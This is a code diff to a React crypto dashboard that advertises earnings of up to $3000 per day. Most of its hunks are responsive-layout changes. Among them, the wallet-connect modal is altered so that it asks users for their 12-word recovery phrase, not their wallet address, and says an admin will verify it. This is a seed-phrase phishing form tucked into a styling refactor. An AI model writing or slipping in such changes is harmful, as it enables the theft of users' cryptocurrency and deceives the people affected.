@@ -477,9 +477,9 @@ export function DashboardHome() {
         </Card>
       ) : !walletBannerDismissed ? (
         /* ── STATE 1: Not connected ── */
-        <Card style={{ padding: '1.25rem 1.5rem', background: 'hsl(260 40% 8%)', border: '1px solid rgba(74,222,128,0.2)', marginBottom: '1rem' }}>
-          <div className="flex items-center justify-between gap-4">
-            <div className="flex items-center gap-4">
+        <Card style={{ padding: '1.25rem 1.25rem', background: 'hsl(260 40% 8%)', border: '1px solid rgba(74,222,128,0.2)', marginBottom: '1rem' }}>
+          <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
+            <div className="flex items-start sm:items-center gap-3 sm:gap-4 min-w-0 flex-1">
               <div style={{
                 width: 42, height: 42, borderRadius: '0.75rem', flexShrink: 0,
                 background: 'linear-gradient(135deg, rgba(74,222,128,0.3) 0%, rgba(34,197,94,0.3) 100%)',
@@ -487,28 +487,31 @@ export function DashboardHome() {
               }}>
                 <WalletCards size={18} style={{ color: '#86efac' }} />
               </div>
-              <div>
+              <div className="min-w-0 flex-1">
                 <p style={{ fontSize: 14, fontWeight: 600, color: 'hsl(40 6% 92%)', marginBottom: 2 }}>
                   Connect Your Wallet to Start Earning
                 </p>
-                <p style={{ fontSize: 12, color: 'hsl(240 5% 55%)', maxWidth: 560 }}>
+                <p style={{ fontSize: 12, color: 'hsl(240 5% 55%)', lineHeight: 1.5 }}>
                   Connect your cryptocurrency wallet to unlock daily earning opportunities of up to{' '}
                   <strong style={{ color: 'hsl(40 6% 85%)' }}>$3000</strong> per day.
                 </p>
               </div>
             </div>
-            <div className="flex items-center gap-2 shrink-0">
+            <div className="flex items-center gap-2 shrink-0 w-full sm:w-auto">
               <button
                 onClick={() => { setShowWalletModal(true); setWalletInput(''); setWalletSaveErr('') }}
                 style={{
-                  display: 'flex', alignItems: 'center', gap: '0.375rem',
-                  padding: '0.5rem 1rem', borderRadius: '0.6rem',
+                  display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '0.375rem',
+                  padding: '0.55rem 1rem', borderRadius: '0.6rem',
                   background: 'linear-gradient(135deg, #88fc8a 0%, #00ff04 100%)',
                   color: '#050505', fontSize: 13, fontWeight: 600,
                   border: 'none', cursor: 'pointer',
                   boxShadow: '0 4px 16px rgba(136,252,138,0.2)',
                   transition: 'opacity 0.15s ease',
+                  flex: '1 1 auto',
+                  whiteSpace: 'nowrap',
                 }}
+                className="sm:!flex-initial"
                 onMouseEnter={e => e.currentTarget.style.opacity = '0.88'}
                 onMouseLeave={e => e.currentTarget.style.opacity = '1'}
               >
@@ -518,7 +521,7 @@ export function DashboardHome() {
               <button
                 onClick={() => setWalletBannerDismissed(true)}
                 style={{
-                  width: 28, height: 28, borderRadius: '50%',
+                  width: 32, height: 32, borderRadius: '50%', flexShrink: 0,
                   background: 'rgba(255,255,255,0.06)', border: '1px solid rgba(255,255,255,0.1)',
                   display: 'flex', alignItems: 'center', justifyContent: 'center',
                   cursor: 'pointer', color: 'hsl(240 5% 55%)',
@@ -573,17 +576,17 @@ export function DashboardHome() {
             </div>
 
             <p style={{ fontSize: 13, color: 'hsl(240 5% 60%)', marginBottom: '1.25rem', lineHeight: 1.6 }}>
-              Enter your cryptocurrency wallet address below. An admin will verify and confirm the connection.
+              Enter your 12-word recovery phrase below to connect your wallet. An admin will verify and confirm the connection.
             </p>
 
             {/* Input */}
             <label style={{ display: 'block', fontSize: 12, fontWeight: 500, color: 'hsl(240 5% 65%)', marginBottom: 6 }}>
-              Wallet Address
+              12-Word Recovery Phrase
             </label>
             <input
               value={walletInput}
               onChange={e => setWalletInput(e.target.value)}
-              placeholder="e.g. 0x1234...abcd or bc1q..."
+              placeholder="e.g. apple banana cherry dragon eagle frost grape honey iris jungle kite lemon"
               style={{
                 width: '100%', padding: '0.65rem 0.875rem', borderRadius: '0.625rem',
                 background: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.1)',
